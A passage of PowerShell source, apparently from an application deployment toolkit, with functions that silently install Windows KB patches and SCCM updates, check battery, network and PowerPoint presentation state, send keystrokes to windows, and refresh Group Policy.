			Write-Log -Message "Check if Microsoft Update [$kbNumber] is installed." -Source ${CmdletName}

			
			[boolean]$kbFound = $false

			
			Get-Hotfix -Id $kbNumber -ErrorAction 'SilentlyContinue' | ForEach-Object { $kbFound = $true }

			If (-not $kbFound) {
				Write-Log -Message 'Unable to detect Windows update history via Get-Hotfix cmdlet. Trying via COM object.' -Source ${CmdletName}

				
				[__comobject]$UpdateSession = New-Object -ComObject "Microsoft.Update.Session"
				[__comobject]$UpdateSearcher = $UpdateSession.CreateUpdateSearcher()
				
				$UpdateSearcher.IncludePotentiallySupersededUpdates = $false
				
				$UpdateSearcher.Online = $false
				[int32]$UpdateHistoryCount = $UpdateSearcher.GetTotalHistoryCount()
				If ($UpdateHistoryCount -gt 0) {
					[psobject]$UpdateHistory = $UpdateSearcher.QueryHistory(0, $UpdateHistoryCount) |
									Select-Object -Property 'Title','Date',
															@{Name = 'Operation'; Expression = { Switch ($_.Operation) { 1 {'Installation'}; 2 {'Uninstallation'}; 3 {'Other'} } } },
															@{Name = 'Status'; Expression = { Switch ($_.ResultCode) { 0 {'Not Started'}; 1 {'In Progress'}; 2 {'Successful'}; 3 {'Incomplete'}; 4 {'Failed'}; 5 {'Aborted'} } } },
															'Description' |
									Sort-Object -Property 'Date' -Descending
					ForEach ($Update in $UpdateHistory) {
						If (($Update.Operation -ne 'Other') -and ($Update.Title -match "\($KBNumber\)")) {
							$LatestUpdateHistory = $Update
							Break
						}
					}
					If (($LatestUpdateHistory.Operation -eq 'Installation') -and ($LatestUpdateHistory.Status -eq 'Successful')) {
						Write-Log -Message "Discovered the following Microsoft Update: `n$($LatestUpdateHistory | Format-List | Out-String)" -Source ${CmdletName}
						$kbFound = $true
					}
					$null = [Runtime.Interopservices.Marshal]::ReleaseComObject($UpdateSession)
					$null = [Runtime.Interopservices.Marshal]::ReleaseComObject($UpdateSearcher)
				}
				Else {
					Write-Log -Message 'Unable to detect Windows update history via COM object.' -Source ${CmdletName}
				}
			}

			
			If (-not $kbFound) {
				Write-Log -Message "Microsoft Update [$kbNumber] is not installed." -Source ${CmdletName}
				Write-Output -InputObject $false
			}
			Else {
				Write-Log -Message "Microsoft Update [$kbNumber] is installed." -Source ${CmdletName}
				Write-Output -InputObject $true
			}
		}
		Catch {
			Write-Log -Message "Failed discovering Microsoft Update [$kbNumber]. `n$(Resolve-Error)" -Severity 3 -Source ${CmdletName}
			If (-not $ContinueOnError) {
				Throw "Failed discovering Microsoft Update [$kbNumber]: $($_.Exception.Message)"
			}
		}
	}
	End {
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function Install-MSUpdates {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$true)]
		[ValidateNotNullorEmpty()]
		[string]$Directory
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header
	}
	Process {
		Write-Log -Message "Recursively install all Microsoft Updates in directory [$Directory]." -Source ${CmdletName}

		
		$kbPattern = '(?i)kb\d{6,8}'

		
		[IO.FileInfo[]]$files = Get-ChildItem -LiteralPath $Directory -Recurse -Include ('*.exe','*.msu','*.msp')
		ForEach ($file in $files) {
			If ($file.Name -match 'redist') {
				[version]$redistVersion = [Diagnostics.FileVersionInfo]::GetVersionInfo($file.FullName).ProductVersion
				[string]$redistDescription = [Diagnostics.FileVersionInfo]::GetVersionInfo($file.FullName).FileDescription

				Write-Log -Message "Install [$redistDescription $redistVersion]..." -Source ${CmdletName}
				
				If ($redistDescription -match 'Win32 Cabinet Self-Extractor') {
					Execute-Process -Path $file.FullName -Parameters '/q' -WindowStyle 'Hidden' -ContinueOnError $true
				}
				Else {
					Execute-Process -Path $file.FullName -Parameters '/quiet /norestart' -WindowStyle 'Hidden' -ContinueOnError $true
				}
			}
			Else {
				
				[string]$kbNumber = [regex]::Match($file.Name, $kbPattern).ToString()
				If (-not $kbNumber) { Continue }

				
				If (-not (Test-MSUpdates -KBNumber $kbNumber)) {
					Write-Log -Message "KB Number [$KBNumber] was not detected and will be installed." -Source ${CmdletName}
					Switch ($file.Extension) {
						
						'.exe' { Execute-Process -Path $file.FullName -Parameters '/quiet /norestart' -WindowStyle 'Hidden' -ContinueOnError $true }
						
						'.msu' { Execute-Process -Path 'wusa.exe' -Parameters "`"$($file.FullName)`" /quiet /norestart" -WindowStyle 'Hidden' -ContinueOnError $true }
						
						'.msp' { Execute-MSI -Action 'Patch' -Path $file.FullName -ContinueOnError $true }
					}
				}
				Else {
					Write-Log -Message "KB Number [$kbNumber] is already installed. Continue..." -Source ${CmdletName}
				}
			}
		}
	}
	End {
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function Get-WindowTitle {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$true,ParameterSetName='SearchWinTitle')]
		[AllowEmptyString()]
		[string]$WindowTitle,
		[Parameter(Mandatory=$true,ParameterSetName='GetAllWinTitles')]
		[ValidateNotNullorEmpty()]
		[switch]$GetAllWindowTitles = $false,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[switch]$DisableFunctionLogging = $false
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header
	}
	Process {
		Try {
			If ($PSCmdlet.ParameterSetName -eq 'SearchWinTitle') {
				If (-not $DisableFunctionLogging) { Write-Log -Message "Find open window title(s) [$WindowTitle] using regex matching." -Source ${CmdletName} }
			}
			ElseIf ($PSCmdlet.ParameterSetName -eq 'GetAllWinTitles') {
				If (-not $DisableFunctionLogging) { Write-Log -Message 'Find all open window title(s).' -Source ${CmdletName} }
			}

			
			[IntPtr[]]$VisibleWindowHandles = [PSADT.UiAutomation]::EnumWindows() | Where-Object { [PSADT.UiAutomation]::IsWindowVisible($_) }

			
			ForEach ($VisibleWindowHandle in $VisibleWindowHandles) {
				If (-not $VisibleWindowHandle) { Continue }
				
				[string]$VisibleWindowTitle = [PSADT.UiAutomation]::GetWindowText($VisibleWindowHandle)
				If ($VisibleWindowTitle) {
					
					[Diagnostics.Process]$Process = Get-Process -ErrorAction 'Stop' | Where-Object { $_.Id -eq [PSADT.UiAutomation]::GetWindowThreadProcessId($VisibleWindowHandle) }
					If ($Process) {
						
						[psobject]$VisibleWindow = New-Object -TypeName 'PSObject' -Property @{
							WindowTitle = $VisibleWindowTitle
							WindowHandle = $VisibleWindowHandle
							ParentProcess= $Process.Name
							ParentProcessMainWindowHandle = $Process.MainWindowHandle
							ParentProcessId = $Process.Id
						}

						
						If ($PSCmdlet.ParameterSetName -eq 'SearchWinTitle') {
							$MatchResult = $VisibleWindow.WindowTitle -match $WindowTitle
							If ($MatchResult) {
								[psobject[]]$VisibleWindows += $VisibleWindow
							}
						}
						ElseIf ($PSCmdlet.ParameterSetName -eq 'GetAllWinTitles') {
							[psobject[]]$VisibleWindows += $VisibleWindow
						}
					}
				}
			}
		}
		Catch {
			If (-not $DisableFunctionLogging) { Write-Log -Message "Failed to get requested window title(s). `n$(Resolve-Error)" -Severity 3 -Source ${CmdletName} }
		}
	}
	End {
		Write-Output -InputObject $VisibleWindows

		If ($DisableFunctionLogging) { . $RevertScriptLogging }
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function Send-Keys {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$false,Position=0)]
		[AllowEmptyString()]
		[ValidateNotNull()]
		[string]$WindowTitle,
		[Parameter(Mandatory=$false,Position=1)]
		[ValidateNotNullorEmpty()]
		[switch]$GetAllWindowTitles = $false,
		[Parameter(Mandatory=$false,Position=2)]
		[ValidateNotNullorEmpty()]
		[IntPtr]$WindowHandle,
		[Parameter(Mandatory=$false,Position=3)]
		[ValidateNotNullorEmpty()]
		[string]$Keys,
		[Parameter(Mandatory=$false,Position=4)]
		[ValidateNotNullorEmpty()]
		[int32]$WaitSeconds
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header

		
		Add-Type -AssemblyName 'System.Windows.Forms' -ErrorAction 'Stop'

		[scriptblock]$SendKeys = {
			Param (
				[Parameter(Mandatory=$true)]
				[ValidateNotNullorEmpty()]
				[IntPtr]$WindowHandle
			)
			Try {
				
				[boolean]$IsBringWindowToFrontSuccess = [PSADT.UiAutomation]::BringWindowToFront($WindowHandle)
				If (-not $IsBringWindowToFrontSuccess) { Throw 'Failed to bring window to foreground.'}

				
				If ($Keys) {
					[boolean]$IsWindowModal = If ([PSADT.UiAutomation]::IsWindowEnabled($WindowHandle)) { $false } Else { $true }
					If ($IsWindowModal) { Throw 'Unable to send keys to window because it may be disabled due to a modal dialog being shown.' }
					[Windows.Forms.SendKeys]::SendWait($Keys)
					Write-Log -Message "Sent key(s) [$Keys] to window title [$($Window.WindowTitle)] with window handle [$WindowHandle]." -Source ${CmdletName}

					If ($WaitSeconds) {
						Write-Log -Message "Sleeping for [$WaitSeconds] seconds." -Source ${CmdletName}
						Start-Sleep -Seconds $WaitSeconds
					}
				}
			}
			Catch {
				Write-Log -Message "Failed to send keys to window title [$($Window.WindowTitle)] with window handle [$WindowHandle]. `n$(Resolve-Error)" -Severity 3 -Source ${CmdletName}
			}
		}
	}
	Process {
		Try {
			If ($WindowHandle) {
				[psobject]$Window = Get-WindowTitle -GetAllWindowTitles | Where-Object { $_.WindowHandle -eq $WindowHandle }
				If (-not $Window) {
					Write-Log -Message "No windows with Window Handle [$WindowHandle] were discovered." -Severity 2 -Source ${CmdletName}
					Return
				}
				& $SendKeys -WindowHandle $Window.WindowHandle
			}
			Else {
				[hashtable]$GetWindowTitleSplat = @{}
				If ($GetAllWindowTitles) { $GetWindowTitleSplat.Add( 'GetAllWindowTitles', $GetAllWindowTitles) }
				Else { $GetWindowTitleSplat.Add( 'WindowTitle', $WindowTitle) }
				[psobject[]]$AllWindows = Get-WindowTitle @GetWindowTitleSplat
				If (-not $AllWindows) {
					Write-Log -Message 'No windows with the specified details were discovered.' -Severity 2 -Source ${CmdletName}
					Return
				}

				ForEach ($Window in $AllWindows) {
					& $SendKeys -WindowHandle $Window.WindowHandle
				}
			}
		}
		Catch {
			Write-Log -Message "Failed to send keys to specified window. `n$(Resolve-Error)" -Severity 3 -Source ${CmdletName}
		}
	}
	End {
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function Test-Battery {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$false)]
		[ValidateNotNullOrEmpty()]
		[switch]$PassThru = $false
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header

		
		Add-Type -Assembly 'System.Windows.Forms' -ErrorAction 'SilentlyContinue'

		
		[hashtable]$SystemTypePowerStatus = @{ }
	}
	Process {
		Write-Log -Message 'Check if system is using AC power or if it is running on battery...' -Source ${CmdletName}

		[Windows.Forms.PowerStatus]$PowerStatus = [Windows.Forms.SystemInformation]::PowerStatus

		
		
		
		
		[string]$PowerLineStatus = $PowerStatus.PowerLineStatus
		$SystemTypePowerStatus.Add('ACPowerLineStatus', $PowerStatus.PowerLineStatus)

		
		[string]$BatteryChargeStatus = $PowerStatus.BatteryChargeStatus
		$SystemTypePowerStatus.Add('BatteryChargeStatus', $PowerStatus.BatteryChargeStatus)

		
		
		
		[single]$BatteryLifePercent = $PowerStatus.BatteryLifePercent
		If (($BatteryChargeStatus -eq 'NoSystemBattery') -or ($BatteryChargeStatus -eq 'Unknown')) {
			[single]$BatteryLifePercent = 0.0
		}
		$SystemTypePowerStatus.Add('BatteryLifePercent', $PowerStatus.BatteryLifePercent)

		
		[int32]$BatteryLifeRemaining = $PowerStatus.BatteryLifeRemaining
		$SystemTypePowerStatus.Add('BatteryLifeRemaining', $PowerStatus.BatteryLifeRemaining)

		
		
		
		[int32]$BatteryFullLifetime = $PowerStatus.BatteryFullLifetime
		$SystemTypePowerStatus.Add('BatteryFullLifetime', $PowerStatus.BatteryFullLifetime)

		
		[boolean]$OnACPower = $false
		If ($PowerLineStatus -eq 'Online') {
			Write-Log -Message 'System is using AC power.' -Source ${CmdletName}
			$OnACPower = $true
		}
		ElseIf ($PowerLineStatus -eq 'Offline') {
			Write-Log -Message 'System is using battery power.' -Source ${CmdletName}
		}
		ElseIf ($PowerLineStatus -eq 'Unknown') {
			If (($BatteryChargeStatus -eq 'NoSystemBattery') -or ($BatteryChargeStatus -eq 'Unknown')) {
				Write-Log -Message "System power status is [$PowerLineStatus] and battery charge status is [$BatteryChargeStatus]. This is most likely due to a damaged battery so we will report system is using AC power." -Source ${CmdletName}
				$OnACPower = $true
			}
			Else {
				Write-Log -Message "System power status is [$PowerLineStatus] and battery charge status is [$BatteryChargeStatus]. Therefore, we will report system is using battery power." -Source ${CmdletName}
			}
		}
		$SystemTypePowerStatus.Add('IsUsingACPower', $OnACPower)

		
		[boolean]$IsLaptop = $false
		If (($BatteryChargeStatus -eq 'NoSystemBattery') -or ($BatteryChargeStatus -eq 'Unknown')) {
			$IsLaptop = $false
		}
		Else {
			$IsLaptop = $true
		}
		
		[int32[]]$ChassisTypes = Get-WmiObject -Class 'Win32_SystemEnclosure' | Where-Object { $_.ChassisTypes } | Select-Object -ExpandProperty 'ChassisTypes'
		Write-Log -Message "The following system chassis types were detected [$($ChassisTypes -join ',')]." -Source ${CmdletName}
		ForEach ($ChassisType in $ChassisTypes) {
			Switch ($ChassisType) {
				{ $_ -eq 9 -or $_ -eq 10 -or $_ -eq 14 } { $IsLaptop = $true } 
				{ $_ -eq 3 } { $IsLaptop = $false } 
			}
		}
		
		$SystemTypePowerStatus.Add('IsLaptop', $IsLaptop)

		If ($PassThru) {
			Write-Output -InputObject $SystemTypePowerStatus
		}
		Else {
			Write-Output -InputObject $OnACPower
		}
	}
	End {
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function Test-NetworkConnection {

	[CmdletBinding()]
	Param (
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header
	}
	Process {
		Write-Log -Message 'Check if system is using a wired network connection...' -Source ${CmdletName}

		[psobject[]]$networkConnected = Get-WmiObject -Class 'Win32_NetworkAdapter' | Where-Object { ($_.NetConnectionStatus -eq 2) -and ($_.NetConnectionID -match 'Local' -or $_.NetConnectionID -match 'Ethernet') -and ($_.NetConnectionID -notmatch 'Wireless') -and ($_.Name -notmatch 'Virtual') } -ErrorAction 'SilentlyContinue'
		[boolean]$onNetwork = $false
		If ($networkConnected) {
			Write-Log -Message 'Wired network connection found.' -Source ${CmdletName}
			[boolean]$onNetwork = $true
		}
		Else {
			Write-Log -Message 'Wired network connection not found.' -Source ${CmdletName}
		}

		Write-Output -InputObject $onNetwork
	}
	End {
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function Test-PowerPoint {

	[CmdletBinding()]
	Param (
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header
	}
	Process {
		Try {
			Write-Log -Message 'Check if PowerPoint is in either fullscreen slideshow mode or presentation mode...' -Source ${CmdletName}
			Try {
				[Diagnostics.Process[]]$PowerPointProcess = Get-Process -ErrorAction 'Stop' | Where-Object { $_.ProcessName -eq 'POWERPNT' }
				If ($PowerPointProcess) {
					[boolean]$IsPowerPointRunning = $true
					Write-Log -Message 'PowerPoint application is running.' -Source ${CmdletName}
				}
				Else {
					[boolean]$IsPowerPointRunning = $false
					Write-Log -Message 'PowerPoint application is not running.' -Source ${CmdletName}
				}
			}
			Catch {
				Throw
			}

			[nullable[boolean]]$IsPowerPointFullScreen = $false
			If ($IsPowerPointRunning) {
				
				If ([Environment]::UserInteractive) {
					
					
					[psobject]$PowerPointWindow = Get-WindowTitle -GetAllWindowTitles | Where-Object { $_.WindowTitle -match '^PowerPoint Slide Show' -or $_.WindowTitle -match '^PowerPoint-' } | Where-Object { $_.ParentProcess -eq 'POWERPNT'} | Select-Object -First 1
					If ($PowerPointWindow) {
						[nullable[boolean]]$IsPowerPointFullScreen = $true
						Write-Log -Message 'Detected that PowerPoint process [POWERPNT] has a window with a title that beings with [PowerPoint Slide Show] or [PowerPoint-].' -Source ${CmdletName}
					}
					Else {
						Write-Log -Message 'Detected that PowerPoint process [POWERPNT] does not have a window with a title that beings with [PowerPoint Slide Show] or [PowerPoint-].' -Source ${CmdletName}
						Try {
							[int32[]]$PowerPointProcessIDs = $PowerPointProcess | Select-Object -ExpandProperty 'Id' -ErrorAction 'Stop'
							Write-Log -Message "PowerPoint process [POWERPNT] has process id(s) [$($PowerPointProcessIDs -join ', ')]." -Source ${CmdletName}
						}
						Catch {
							Write-Log -Message "Unable to retrieve process id(s) for [POWERPNT] process. `n$(Resolve-Error)" -Severity 2 -Source ${CmdletName}
						}
					}

					
					If ((-not $IsPowerPointFullScreen) -and (([version]$envOSVersion).Major -gt 5)) {
						
						[string]$UserNotificationState = [PSADT.UiAutomation]::GetUserNotificationState()
						Write-Log -Message "Detected user notification state [$UserNotificationState]." -Source ${CmdletName}
						Switch ($UserNotificationState) {
							'PresentationMode' {
								Write-Log -Message "Detected that system is in [Presentation Mode]." -Source ${CmdletName}
								[nullable[boolean]]$IsPowerPointFullScreen = $true
							}
							'FullScreenOrPresentationModeOrLoginScreen' {
								If (([string]$PowerPointProcessIDs) -and ($PowerPointProcessIDs -contains [PSADT.UIAutomation]::GetWindowThreadProcessID([PSADT.UIAutomation]::GetForeGroundWindow()))) {
									Write-Log -Message "Detected that fullscreen foreground window matches PowerPoint process id." -Source ${CmdletName}
									[nullable[boolean]]$IsPowerPointFullScreen = $true
								}
							}
						}
					}
				}
				Else {
					[nullable[boolean]]$IsPowerPointFullScreen = $null
					Write-Log -Message 'Unable to run check to see if PowerPoint is in fullscreen mode or Presentation Mode because current process is not interactive. Configure script to run in interactive mode in your deployment tool. If using SCCM Application Model, then make sure "Allow users to view and interact with the program installation" is selected. If using SCCM Package Model, then make sure "Allow users to interact with this program" is selected.' -Severity 2 -Source ${CmdletName}
				}
			}
		}
		Catch {
			[nullable[boolean]]$IsPowerPointFullScreen = $null
			Write-Log -Message "Failed check to see if PowerPoint is running in fullscreen slideshow mode. `n$(Resolve-Error)" -Severity 3 -Source ${CmdletName}
		}
	}
	End {
		Write-Log -Message "PowerPoint is running in fullscreen mode [$IsPowerPointFullScreen]." -Source ${CmdletName}
		Write-Output -InputObject $IsPowerPointFullScreen
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function Invoke-SCCMTask {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$true)]
		[ValidateSet('HardwareInventory','SoftwareInventory','HeartbeatDiscovery','SoftwareInventoryFileCollection','RequestMachinePolicy','EvaluateMachinePolicy','LocationServicesCleanup','SoftwareMeteringReport','SourceUpdate','PolicyAgentCleanup','RequestMachinePolicy2','CertificateMaintenance','PeerDistributionPointStatus','PeerDistributionPointProvisioning','ComplianceIntervalEnforcement','SoftwareUpdatesAgentAssignmentEvaluation','UploadStateMessage','StateMessageManager','SoftwareUpdatesScan','AMTProvisionCycle','UpdateStorePolicy','StateSystemBulkSend','ApplicationManagerPolicyAction','PowerManagementStartSummarizer')]
		[string]$ScheduleID,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[boolean]$ContinueOnError = $true
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header
	}
	Process {
		Try {
			Write-Log -Message "Invoke SCCM Schedule Task ID [$ScheduleId]..." -Source ${CmdletName}

			
			Write-Log -Message 'Check to see if SCCM Client service [ccmexec] is installed and running.' -Source ${CmdletName}
			If (Test-ServiceExists -Name 'ccmexec') {
				If ($(Get-Service -Name 'ccmexec' -ErrorAction 'SilentlyContinue').Status -ne 'Running') {
					Throw "SCCM Client Service [ccmexec] exists but it is not in a 'Running' state."
				}
			} Else {
				Throw 'SCCM Client Service [ccmexec] does not exist. The SCCM Client may not be installed.'
			}

			
			Try {
				[version]$SCCMClientVersion = Get-WmiObject -Namespace 'ROOT\CCM' -Class 'CCM_InstalledComponent' -ErrorAction 'Stop' | Where-Object { $_.Name -eq 'SmsClient' } | Select-Object -ExpandProperty 'Version' -ErrorAction 'Stop'
				Write-Log -Message "Installed SCCM Client Version Number [$SCCMClientVersion]." -Source ${CmdletName}
			}
			Catch {
				Write-Log -Message "Failed to determine the SCCM client version number. `n$(Resolve-Error)" -Severity 2 -Source ${CmdletName}
				Throw 'Failed to determine the SCCM client version number.'
			}

			
			[hashtable]$ScheduleIds = @{
				HardwareInventory = '{00000000-0000-0000-0000-000000000001}'; 
				SoftwareInventory = '{00000000-0000-0000-0000-000000000002}'; 
				HeartbeatDiscovery = '{00000000-0000-0000-0000-000000000003}'; 
				SoftwareInventoryFileCollection = '{00000000-0000-0000-0000-000000000010}'; 
				RequestMachinePolicy = '{00000000-0000-0000-0000-000000000021}'; 
				EvaluateMachinePolicy = '{00000000-0000-0000-0000-000000000022}'; 
				RefreshDefaultMp = '{00000000-0000-0000-0000-000000000023}'; 
				RefreshLocationServices = '{00000000-0000-0000-0000-000000000024}'; 
				LocationServicesCleanup = '{00000000-0000-0000-0000-000000000025}'; 
				SoftwareMeteringReport = '{00000000-0000-0000-0000-000000000031}'; 
				SourceUpdate = '{00000000-0000-0000-0000-000000000032}'; 
				PolicyAgentCleanup = '{00000000-0000-0000-0000-000000000040}'; 
				RequestMachinePolicy2 = '{00000000-0000-0000-0000-000000000042}'; 
				CertificateMaintenance = '{00000000-0000-0000-0000-000000000051}'; 
				PeerDistributionPointStatus = '{00000000-0000-0000-0000-000000000061}'; 
				PeerDistributionPointProvisioning = '{00000000-0000-0000-0000-000000000062}'; 
				ComplianceIntervalEnforcement = '{00000000-0000-0000-0000-000000000071}'; 
				SoftwareUpdatesAgentAssignmentEvaluation = '{00000000-0000-0000-0000-000000000108}'; 
				UploadStateMessage = '{00000000-0000-0000-0000-000000000111}'; 
				StateMessageManager = '{00000000-0000-0000-0000-000000000112}'; 
				SoftwareUpdatesScan = '{00000000-0000-0000-0000-000000000113}'; 
				AMTProvisionCycle = '{00000000-0000-0000-0000-000000000120}'; 
			}

			
			If ($SCCMClientVersion.Major -ge 5) {
				$ScheduleIds.Remove('PeerDistributionPointStatus')
				$ScheduleIds.Remove('PeerDistributionPointProvisioning')
				$ScheduleIds.Remove('ComplianceIntervalEnforcement')
				$ScheduleIds.Add('UpdateStorePolicy','{00000000-0000-0000-0000-000000000114}') 
				$ScheduleIds.Add('StateSystemBulkSend','{00000000-0000-0000-0000-000000000116}') 
				$ScheduleIds.Add('ApplicationManagerPolicyAction','{00000000-0000-0000-0000-000000000121}') 
				$ScheduleIds.Add('PowerManagementStartSummarizer','{00000000-0000-0000-0000-000000000131}') 
			}

			
			If (-not ($ScheduleIds.ContainsKey($ScheduleId))) {
				Throw "The requested ScheduleId [$ScheduleId] is not available with this version of the SCCM Client [$SCCMClientVersion]."
			}

			
			Write-Log -Message "Trigger SCCM Task ID [$ScheduleId]." -Source ${CmdletName}
			[Management.ManagementClass]$SmsClient = [WMIClass]'ROOT\CCM:SMS_Client'
			$null = $SmsClient.TriggerSchedule($ScheduleIds.$ScheduleID)
		}
		Catch {
			Write-Log -Message "Failed to trigger SCCM Schedule Task ID [$($ScheduleIds.$ScheduleId)]. `n$(Resolve-Error)" -Severity 3 -Source ${CmdletName}
			If (-not $ContinueOnError) {
				Throw "Failed to trigger SCCM Schedule Task ID [$($ScheduleIds.$ScheduleId)]: $($_.Exception.Message)"
			}
		}
	}
	End {
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function Install-SCCMSoftwareUpdates {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[int32]$SoftwareUpdatesScanWaitInSeconds = 180,
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[timespan]$WaitForPendingUpdatesTimeout = $(New-TimeSpan -Minutes 45),
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[boolean]$ContinueOnError = $true
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header
	}
	Process {
		Try {
			Write-Log -Message 'Scan for and install pending SCCM software updates.' -Source ${CmdletName}

			
			Write-Log -Message 'Check to see if SCCM Client service [ccmexec] is installed and running.' -Source ${CmdletName}
			If (Test-ServiceExists -Name 'ccmexec') {
				If ($(Get-Service -Name 'ccmexec' -ErrorAction 'SilentlyContinue').Status -ne 'Running') {
					Throw "SCCM Client Service [ccmexec] exists but it is not in a 'Running' state."
				}
			} Else {
				Throw 'SCCM Client Service [ccmexec] does not exist. The SCCM Client may not be installed.'
			}

			
			Try {
				[version]$SCCMClientVersion = Get-WmiObject -Namespace 'ROOT\CCM' -Class 'CCM_InstalledComponent' -ErrorAction 'Stop' | Where-Object { $_.Name -eq 'SmsClient' } | Select-Object -ExpandProperty 'Version' -ErrorAction 'Stop'
				Write-Log -Message "Installed SCCM Client Version Number [$SCCMClientVersion]." -Source ${CmdletName}
			}
			Catch {
				Write-Log -Message "Failed to determine the SCCM client version number. `n$(Resolve-Error)" -Severity 2 -Source ${CmdletName}
				Throw 'Failed to determine the SCCM client version number.'
			}
			
			If ($SCCMClientVersion.Major -le 4) {
				Throw 'SCCM 2007 or lower, which is incompatible with this function, was detected on this system.'
			}

			$StartTime = Get-Date
			
			Write-Log -Message 'Trigger SCCM client scan for Software Updates...' -Source ${CmdletName}
			Invoke-SCCMTask -ScheduleId 'SoftwareUpdatesScan'

			Write-Log -Message "The SCCM client scan for Software Updates has been triggered. The script is suspended for [$SoftwareUpdatesScanWaitInSeconds] seconds to let the update scan finish." -Source ${CmdletName}
			Start-Sleep -Seconds $SoftwareUpdatesScanWaitInSeconds

			
			Try {
				[Management.ManagementObject[]]$CMMissingUpdates = @(Get-WmiObject -Namespace 'ROOT\CCM\ClientSDK' -Query "SELECT * FROM CCM_SoftwareUpdate WHERE ComplianceState = '0'" -ErrorAction 'Stop')
			}
			Catch {
				Write-Log -Message "Failed to find the number of missing software updates. `n$(Resolve-Error)" -Severity 2 -Source ${CmdletName}
				Throw 'Failed to find the number of missing software updates.'
			}

			
			If ($CMMissingUpdates.Count) {
				
				Write-Log -Message "Install missing updates. The number of missing updates is [$($CMMissingUpdates.Count)]." -Source ${CmdletName}
				$CMInstallMissingUpdates = (Get-WmiObject -Namespace 'ROOT\CCM\ClientSDK' -Class 'CCM_SoftwareUpdatesManager' -List).InstallUpdates($CMMissingUpdates)

				
				Do {
					Start-Sleep -Seconds 60
					[array]$CMInstallPendingUpdates = @(Get-WmiObject -Namespace "ROOT\CCM\ClientSDK" -Query "SELECT * FROM CCM_SoftwareUpdate WHERE EvaluationState = 6 or EvaluationState = 7")
					Write-Log -Message "The number of updates pending installation is [$($CMInstallPendingUpdates.Count)]." -Source ${CmdletName}
				} While (($CMInstallPendingUpdates.Count -ne 0) -and ((New-TimeSpan -Start $StartTime -End $(Get-Date)) -lt $WaitForPendingUpdatesTimeout))
			}
			Else {
				Write-Log -Message 'There are no missing updates.' -Source ${CmdletName}
			}
		}
		Catch {
			Write-Log -Message "Failed to trigger installation of missing software updates. `n$(Resolve-Error)" -Severity 3 -Source ${CmdletName}
			If (-not $ContinueOnError) {
				Throw "Failed to trigger installation of missing software updates: $($_.Exception.Message)"
			}
		}
	}
	End {
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -Footer
	}
}




Function Update-GroupPolicy {

	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$false)]
		[ValidateNotNullorEmpty()]
		[boolean]$ContinueOnError = $true
	)

	Begin {
		
		[string]${CmdletName} = $PSCmdlet.MyInvocation.MyCommand.Name
		Write-FunctionHeaderOrFooter -CmdletName ${CmdletName} -CmdletBoundParameters $PSBoundParameters -Header
	}
	Process {
		[string[]]$GPUpdateCmds = '/C echo N | gpupdate.exe /Target:Computer /Force', '/C echo N | gpupdate.exe /Target:User /Force'
		[int32]$InstallCount = 0
		ForEach ($GPUpdateCmd in $GPUpdateCmds) {
			Try {
				If ($InstallCount -eq 0) {
					[string]$InstallMsg = 'Update Group Policies for the Machine'
					Write-Log -Message "$($InstallMsg)..." -Source ${CmdletName}
				}
				Else {
					[string]$InstallMsg = 'Update Group Policies for the User'
					Write-Log -Message "$($InstallMsg)..." -Source ${CmdletName}
				}
				[psobject]$ExecuteResult = Execute-Process -Path "$envWindir\system32\cmd.exe" -Parameters $GPUpdateCmd -WindowStyle 'Hidden' -PassThru

				If ($ExecuteResult.ExitCode -ne 0) {
					If ($ExecuteResult.ExitCode -eq 60002) {
						Throw "Execute-Process function failed with exit code [$($ExecuteResult.ExitCode)]."
					}
					Else {
						Throw "gpupdate.exe failed with exit code [$($ExecuteResult.ExitCode)]."
					}
				}
